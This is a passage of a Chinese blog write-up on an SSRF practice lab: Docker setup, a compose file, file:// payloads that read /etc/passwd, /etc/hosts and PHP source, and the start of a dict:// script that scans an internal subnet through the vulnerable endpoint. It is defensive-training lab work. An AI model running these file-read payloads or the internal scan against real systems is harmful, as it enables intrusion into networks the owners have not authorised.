@@ -1,0 +1,592 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="国光是神"><title>国光靶场ssrf打穿内网</title><link rel=canonical href=https://baozongwi.xyz/p/guoguang-range-ssrf-intranet-penetration/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="国光靶场ssrf打穿内网"><meta property='og:description' content="国光是神"><meta property='og:url' content='https://baozongwi.xyz/p/guoguang-range-ssrf-intranet-penetration/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='ssrf'><meta property='article:tag' content='内网渗透'><meta property='article:published_time' content='2025-04-02T14:18:15+00:00'><meta property='article:modified_time' content='2025-04-02T14:18:15+00:00'><meta name=twitter:title content="国光靶场ssrf打穿内网"><meta name=twitter:description content="国光是神"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#19216810021外网ssrf>192.168.100.21外网SSRF</a></li><li><a href=#19216810022rce>192.168.100.22RCE</a></li><li><a href=#19216810023sqli>192.168.100.23sqli</a></li><li><a href=#19216810024rce>192.168.100.24RCE</a></li><li><a href=#19216810025xxe>192.168.100.25XXE</a></li><li><a href=#19216810026tomcat8519>192.168.100.26Tomcat/8.5.19</a></li><li><a href=#19216810027redis未授权>192.168.100.27redis未授权</a></li><li><a href=#19216810028redis授权>192.168.100.28redis授权</a></li><li><a href=#19216810029未授权mysql>192.168.100.29未授权mysql</a></li><li><a href=#小结>小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%A4%8D%E7%8E%B0/>复现</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/guoguang-range-ssrf-intranet-penetration/>国光靶场ssrf打穿内网</a></h2><h3 class=article-subtitle>国光是神</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2025-04-02T14:18:15Z>Apr 02, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 315 天前，文中的内容可能已有所发展或发生改变。</span></div><p>之前看过那篇文章所以非常想自己试试手，拓扑图如下</p><p><img src="https://github.com/sqlsec/ssrf-vuls/blob/main/imgs/total.png?raw=true" loading=lazy alt=total.png></p><p>看着这么多，我们利用源码制作好docker之后放到dockerhub就可以只利用一台机器完成靶场搭建，每构建好一个需要推到dockerhub，运行以下命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>docker commit 669053d5f83a baozongwi/ssrf-web2:latest
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>docker login -u baozongwi
+</span></span><span class=line><span class=cl># 登录之后就可以push上去了
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>docker push baozongwi/ssrf-web2:latest
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># 用于清空镜像和容器
+</span></span><span class=line><span class=cl>docker rm -f $(docker ps -aq) &amp;&amp; docker rmi -f $(docker images -q)
+</span></span></code></pre></td></tr></table></div></div><p>但是弄到sqli那台机器之后168师傅回复我了，他居然还存了compose，不过这里也学会怎么往dockerhub上面pull了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>ipam</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>config</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span>- <span class=nt>subnet</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.0</span><span class=l>/24 </span><span class=w> </span><span class=c># 改为 192.168.100.0/24，避免冲突</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>          </span><span class=nt>gateway</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>services</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb1</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_web:v1</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>ports</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=m>8090</span><span class=p>:</span><span class=m>80</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.21</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb2</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_codesec:v2</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.22</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb3</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_sql:v3</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.23</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb4</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_commandexec:v4</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.24</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb5</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_xxe:v5</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.25</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb6</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_tomcat:v6</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.26</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb7</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_redisunauth:v7</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.27</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb8</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_redisauth:v8</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.28</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>ssrfweb9</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>image</span><span class=p>:</span><span class=w> </span><span class=l>selectarget/ssrf_mysql:v9</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>networks</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=nt>ssrf_v</span><span class=p>:</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nt>ipv4_address</span><span class=p>:</span><span class=w> </span><span class=m>192.168.100.29</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>但是肯定是要改网络的，每个人的网络都是不一样的，并且是9台机器</p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-101224.jpg width=1131 height=378 loading=lazy alt=1></p><h2 id=19216810021外网ssrf>192.168.100.21外网SSRF</h2><p>进入网站，看到是个爬虫网页，随便输入一个网页发现如下</p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-101720.jpg width=1630 height=818 loading=lazy alt=1></p><p>基本可以确诊是SSRF，我们试试<code>file</code>读取文件，发现成功</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file:///etc/passwd
+</span></span></code></pre></td></tr></table></div></div><p>打算读取源码发现<code>file://index.php</code>没有成功但是可以从根目录过去读<code>file:///var/www/html/index.php</code>得到结果</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>    <span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>curl</span><span class=p>(</span><span class=nv>$url</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>      <span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>      <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HEADER</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nx>curl_close</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>非常典型的SSRF漏洞代码，顺便读取一个flag，<code>file:///var/www/html/flag</code>这台机器基本就没有用了，我们就要选择深入内网，还是做基本的信息收集，但是这里不能RCE，只能利用文件读取，所以我们先读取一下<code>hosts</code>得到这台机器的内网IP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file:///etc/hosts
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>#############################################
+</span></span><span class=line><span class=cl>127.0.0.1	localhost
+</span></span><span class=line><span class=cl>::1	localhost ip6-localhost ip6-loopback
+</span></span><span class=line><span class=cl>fe00::0	ip6-localnet
+</span></span><span class=line><span class=cl>ff00::0	ip6-mcastprefix
+</span></span><span class=line><span class=cl>ff02::1	ip6-allnodes
+</span></span><span class=line><span class=cl>ff02::2	ip6-allrouters
+</span></span><span class=line><span class=cl>192.168.100.21	eb5b2908723b
+</span></span></code></pre></td></tr></table></div></div><p>使用dict协议进行爆破路由，超时就是未存活的IP，但是这种未超时又太过明显，如图</p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-102320.jpg width=1726 height=939 loading=lazy alt=1></p><p>这种用bp应该是筛选不出来的，所以只能写个脚本，刚开始写的时候没加多线程，发现太慢了，后面还是直接加了一个多线程，同时也发现我试了几种方法发现最后都会有漏扫或者是扫错的情况，这个问题后面再深究，那就只能慢慢等一下了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>alive_ips</span><span class=o>=</span><span class=p>[]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://156.238.233.93:8080/&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>255</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>ip</span><span class=o>=</span><span class=s2>&#34;172.72.0.&#34;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;url&#34;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;dict://</span><span class=si>{</span><span class=n>ip</span><span class=si>}</span><span class=s2>/&#34;</span><span class=p>},</span><span class=n>timeout</span><span class=o>=</span><span class=mf>1.5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>ip</span><span class=o>+</span><span class=s2>&#34;存活&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>alive_ips</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ip</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>Timeout</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>ip</span><span class=o>+</span><span class=s2>&#34;未存活&#34;</span><span class=p>)</span>
